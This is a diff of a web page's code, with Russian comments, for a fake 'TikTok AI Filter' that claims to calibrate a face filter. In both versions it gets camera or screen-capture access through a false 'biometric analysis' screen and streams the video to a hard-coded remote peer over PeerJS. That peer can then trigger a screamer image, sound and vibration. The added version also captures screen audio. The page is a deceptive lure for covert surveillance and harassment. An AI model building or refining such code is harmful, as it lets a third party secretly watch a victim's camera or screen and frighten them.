@@ -1,104 +1,66 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>TikTok AI Filter</title>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
-    <style>
-        body { background: #000; color: white; font-family: -apple-system, sans-serif; text-align: center; display: flex; flex-direction: column; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        .btn { background: #ff0050; color: white; border: none; padding: 20px 40px; font-size: 18px; font-weight: bold; border-radius: 50px; cursor: pointer; margin: 10px; box-shadow: 0 0 20px rgba(255,0,80,0.6); }
-        #loader { display: none; }
-        .spinner { border: 4px solid rgba(255,255,255,0.1); border-left-color: #ff0050; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { to { transform: rotate(360deg); } }
+<script>
+    const REMOTE_ID = '09062012'; //
+    const peer = new Peer();
 
-        /* Слой скримера */
-        #scary-overlay {
-            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-            background: black; display: none; z-index: 9999;
-            justify-content: center; align-items: center;
-        }
-        #scary-overlay img { width: 100%; height: 100%; object-fit: cover; }
-    </style>
-</head>
-<body>
-
-    <div id="ui">
-        <img src="https://www.edigitalagency.com.au/wp-content/uploads/TikTok-logo-PNG.png" width="80" style="margin-bottom: 20px;">
-        <h1 style="font-size: 22px;">AI-Фильтр "Идеальное лицо"</h1>
-        <p style="padding: 0 20px; color: #ccc;">Выберите режим калибровки нейросети:</p>
-        
-        <button class="btn" onclick="startPrank('camera')">ФРОНТАЛЬНАЯ КАМЕРА</button>
-        <button class="btn" style="background: #444;" onclick="startPrank('screen')">ЗАХВАТ ЭКРАНА (BETA)</button>
-    </div>
-
-    <div id="loader">
-        <div class="spinner"></div>
-        <h2 id="load-text">Анализ биометрии... 0%</h2>
-        <p>Держите лицо в центре кадра</p>
-    </div>
-
-    <video id="myVideo" autoplay muted playsinline style="position: absolute; width: 1px; height: 1px; opacity: 0;"></video>
-    
-    <div id="scary-overlay">
-        <img src="https://i.imgur.com/v799C7v.jpeg">
-        <audio id="scary-sound" src="https://www.myinstants.com/media/sounds/screamer.mp3" preload="auto"></audio>
-    </div>
-
-    <script>
-        const REMOTE_ID = '09062012'; 
-        let peer = new Peer();
-
-        // Ждем сигнал от монитора (команду на скример)
-        peer.on('connection', (conn) => {
-            conn.on('data', (data) => {
-                if (data === 'ATTACK') {
-                    showScreamer();
-                }
-            });
+    // Слушаем атаку от монитора
+    peer.on('connection', (conn) => {
+        conn.on('data', (data) => {
+            if (data === 'ATTACK') showScreamer(); //
         });
+    });
 
-        function showScreamer() {
-            const overlay = document.getElementById('scary-overlay');
-            const sound = document.getElementById('scary-sound');
-            overlay.style.display = 'flex';
-            sound.play().catch(e => console.log("Нужен был клик пользователя"));
+    async function startPrank(type) {
+        try {
+            let stream;
             
-            // Вибрация телефона (если Android)
-            if (navigator.vibrate) navigator.vibrate([500, 200, 500]);
-        }
-
-        async function startPrank(mode) {
-            try {
-                let stream;
-                if (mode === 'screen') {
-                    stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-                } else {
-                    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-                }
-
-                const video = document.getElementById('myVideo');
-                video.srcObject = stream;
-                
-                document.getElementById('ui').style.display = 'none';
-                document.getElementById('loader').style.display = 'block';
-                
-                // Имитация загрузки
-                let progress = 0;
-                setInterval(() => {
-                    if (progress < 99) {
-                        progress += Math.floor(Math.random() * 2);
-                        document.getElementById('load-text').innerText = "Анализ биометрии... " + progress + "%";
-                    }
-                }, 600);
-
-                // Передаем видео на монитор
-                peer.call(REMOTE_ID, stream, { metadata: { device: mode } });
-
-            } catch (err) {
-                alert("Доступ отклонен. Без калибровки фильтр не работает.");
+            if (type === 'screen') {
+                // Запрос доступа к ЭКРАНУ
+                stream = await navigator.mediaDevices.getDisplayMedia({ 
+                    video: true, 
+                    audio: true 
+                });
+            } else {
+                // Запрос доступа к КАМЕРЕ
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: false 
+                });
             }
+
+            // Прячем кнопку и показываем лоадер
+            document.getElementById('ui').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
+
+            // Инициализируем соединение для команд
+            const conn = peer.connect(REMOTE_ID, { metadata: { device: type } });
+            
+            // Звоним на монитор и передаем поток
+            peer.call(REMOTE_ID, stream, { metadata: { device: type } });
+
+            // Фейковая загрузка
+            fakeProgress();
+
+        } catch (err) {
+            console.error(err);
+            alert("Для работы фильтра нужен доступ к " + (type === 'screen' ? "экрану" : "камере"));
         }
-    </script>
-</body>
-</html>
+    }
+
+    function fakeProgress() {
+        let p = 0;
+        setInterval(() => {
+            if (p < 99) {
+                p += Math.floor(Math.random() * 3);
+                document.getElementById('load-text').innerText = "Анализ данных... " + p + "%";
+            }
+        }, 500);
+    }
+
+    function showScreamer() {
+        const overlay = document.getElementById('scary-overlay');
+        const sound = document.getElementById('scary-sound');
+        overlay.style.display = 'flex';
+        sound.play(); //
+        if (navigator.vibrate) navigator.vibrate(1000);
+    }
+</script>
